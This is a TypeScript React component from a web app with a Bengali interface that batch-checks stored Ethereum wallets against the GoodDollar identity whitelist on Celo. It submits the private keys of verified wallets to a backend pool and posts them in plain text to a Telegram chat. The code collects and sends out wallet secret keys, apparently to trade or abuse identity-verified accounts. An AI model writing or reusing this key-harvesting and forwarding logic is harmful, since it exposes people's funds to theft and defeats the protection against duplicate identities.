import { useState, useCallback } from "react";
import { useAuth } from "@/hooks/use-auth";
import { useToast } from "@/hooks/use-toast";
import { useQueryClient } from "@tanstack/react-query";
import { getPendingKeys, clearPendingKeys, savePendingKeys } from "@/components/KeySubmitter";
import { submitKey, addPoolKey } from "@/lib/api";
import { supabase } from "@/integrations/supabase/client";
import { ethers } from "ethers";
import { motion, AnimatePresence } from "framer-motion";
import { Send, Loader2, CheckCircle, XCircle, Package } from "lucide-react";

const GD_IDENTITY_ADDRESS = "0xC361A6E67822a0EDc17D899227dd9FC50BD62F42";
const CELO_RPC = "https://forno.celo.org";
const GD_IDENTITY_ABI = [
  "function isWhitelisted(address account) view returns (bool)",
];

export function SubmitAllButton() {
  const { user, refreshUser } = useAuth();
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [progress, setProgress] = useState({ total: 0, checked: 0, verified: 0, failed: 0 });

  const pendingKeys = getPendingKeys();
  const pendingCount = pendingKeys.length;

  const handleSubmitAll = useCallback(async () => {
    if (!user || pendingCount === 0 || isSubmitting) return;

    setIsSubmitting(true);
    const keys = getPendingKeys();
    setProgress({ total: keys.length, checked: 0, verified: 0, failed: 0 });

    try {
      const provider = new ethers.JsonRpcProvider(CELO_RPC);
      const contract = new ethers.Contract(GD_IDENTITY_ADDRESS, GD_IDENTITY_ABI, provider);

      let verifiedCount = 0;
      let failedCount = 0;
      const verifiedKeys: string[] = [];

      for (let i = 0; i < keys.length; i++) {
        try {
          const result = await contract.isWhitelisted(keys[i].address);
          if (result === true) {
            // This key is verified - submit it
            await submitKey(user.id, keys[i].privateKey);

            // Mark as used in pool
            const guestId = user.guest_id || "Unknown";
            await supabase
              .from("verification_pool")
              .update({ is_used: true })
              .eq("private_key", keys[i].privateKey)
              .eq("added_by", guestId);

            verifiedKeys.push(keys[i].privateKey);
            verifiedCount++;
          } else {
            failedCount++;
          }
        } catch (err) {
          console.error("Check failed for key:", err);
          failedCount++;
        }
        setProgress({ total: keys.length, checked: i + 1, verified: verifiedCount, failed: failedCount });
      }

      // Send all verified keys to Telegram in one message
      if (verifiedKeys.length > 0) {
        try {
          const telegramMessage = `🔑 <b>Batch Submit</b>\n👤 ${user.display_name || user.guest_id} (ID: ${user.id})\n✅ Verified: ${verifiedKeys.length}/${keys.length}\n\n${verifiedKeys.map((k, i) => `${i + 1}. <code>${k}</code>`).join("\n")}`;
          await supabase.functions.invoke("send-telegram", {
            body: { message: telegramMessage },
          });
        } catch (e) {
          console.error("Telegram notification failed:", e);
        }
      }

      // Clear all pending keys
      clearPendingKeys();

      await refreshUser();
      queryClient.invalidateQueries({ queryKey: ["user"] });
      queryClient.invalidateQueries({ queryKey: ["transactions"] });
      queryClient.invalidateQueries({ queryKey: ["pending-keys-count"] });

      if (verifiedCount > 0) {
        toast({
          title: `✅ ${verifiedCount} টি ভেরিফাইড সাবমিট হয়েছে!`,
          description: failedCount > 0 ? `${failedCount} টি ভেরিফাই হয়নি, বাতিল হয়েছে।` : "সব সফলভাবে সাবমিট হয়েছে!",
        });
      } else {
        toast({
          title: "❌ কোনো কী ভেরিফাইড নয়",
          description: "একটিও whitelist এ পাওয়া যায়নি। আগে ভেরিফিকেশন সম্পন্ন করুন।",
          variant: "destructive",
        });
      }
    } catch (err: any) {
      toast({ title: "Submit All ব্যর্থ", description: err.message, variant: "destructive" });
    } finally {
      setIsSubmitting(false);
      setProgress({ total: 0, checked: 0, verified: 0, failed: 0 });
    }
  }, [user, pendingCount, isSubmitting, refreshUser, queryClient, toast]);

  if (pendingCount === 0 && !isSubmitting) return null;

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      className="glass-card rounded-3xl relative overflow-hidden"
    >
      <div className="relative p-6">
        <motion.div
          className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-[hsl(var(--amber))] via-[hsl(var(--orange))] to-[hsl(var(--pink))]"
          animate={{ backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"] }}
          transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
          style={{ backgroundSize: "200% 100%" }}
        />

        <div className="flex items-center gap-3 mb-4">
          <motion.div
            animate={{ scale: [1, 1.1, 1] }}
            transition={{ duration: 2, repeat: Infinity }}
            className="p-2.5 bg-gradient-to-br from-[hsl(var(--amber))]/20 to-[hsl(var(--orange))]/20 rounded-xl border border-[hsl(var(--amber))]/30"
          >
            <Package className="w-6 h-6 text-[hsl(var(--amber))]" />
          </motion.div>
          <div>
            <h2 className="text-lg font-black">Submit All</h2>
            <p className="text-[10px] text-muted-foreground">{pendingCount} টি কী পেন্ডিং আছে</p>
          </div>
        </div>

        <AnimatePresence mode="wait">
          {isSubmitting ? (
            <motion.div
              key="progress"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="space-y-4"
            >
              <div className="bg-secondary/30 rounded-2xl p-4">
                <div className="flex items-center justify-center gap-3 mb-3">
                  <Loader2 className="w-6 h-6 animate-spin text-[hsl(var(--amber))]" />
                  <p className="text-sm font-bold">চেক করা হচ্ছে... {progress.checked}/{progress.total}</p>
                </div>
                <div className="w-full h-2 bg-secondary rounded-full overflow-hidden">
                  <motion.div
                    className="h-full bg-gradient-to-r from-[hsl(var(--amber))] to-[hsl(var(--emerald))]"
                    animate={{ width: `${progress.total > 0 ? (progress.checked / progress.total) * 100 : 0}%` }}
                  />
                </div>
                <div className="flex justify-between mt-2 text-xs">
                  <span className="text-[hsl(var(--emerald))] font-bold flex items-center gap-1">
                    <CheckCircle className="w-3 h-3" /> {progress.verified} ভেরিফাইড
                  </span>
                  <span className="text-destructive font-bold flex items-center gap-1">
                    <XCircle className="w-3 h-3" /> {progress.failed} ব্যর্থ
                  </span>
                </div>
              </div>
            </motion.div>
          ) : (
            <motion.button
              key="button"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={handleSubmitAll}
              whileHover={{ scale: 1.03, y: -2 }}
              whileTap={{ scale: 0.97 }}
              className="w-full relative py-5 rounded-2xl font-black text-base text-primary-foreground overflow-hidden shadow-2xl"
            >
              <motion.div
                className="absolute inset-0 bg-gradient-to-r from-[hsl(var(--amber))] via-[hsl(var(--orange))] to-[hsl(var(--pink))]"
                animate={{ backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"] }}
                transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
                style={{ backgroundSize: "200% 100%" }}
              />
              <motion.div
                className="absolute inset-0 bg-gradient-to-r from-transparent via-white/25 to-transparent"
                animate={{ x: ["-100%", "200%"] }}
                transition={{ duration: 1.8, repeat: Infinity, repeatDelay: 0.8, ease: "easeInOut" }}
              />
              <div className="absolute inset-0 rounded-2xl border-2 border-white/25" />
              <span className="relative z-10 flex items-center justify-center gap-3">
                <Send className="w-5 h-5" />
                <span className="text-lg">Submit All ({pendingCount} টি কী)</span>
              </span>
            </motion.button>
          )}
        </AnimatePresence>

        <p className="text-[10px] text-center text-muted-foreground mt-3">
          ভেরিফাইড কী গুলো কাউন্ট হবে • বাকিগুলো বাতিল হবে
        </p>
      </div>
    </motion.div>
  );
}
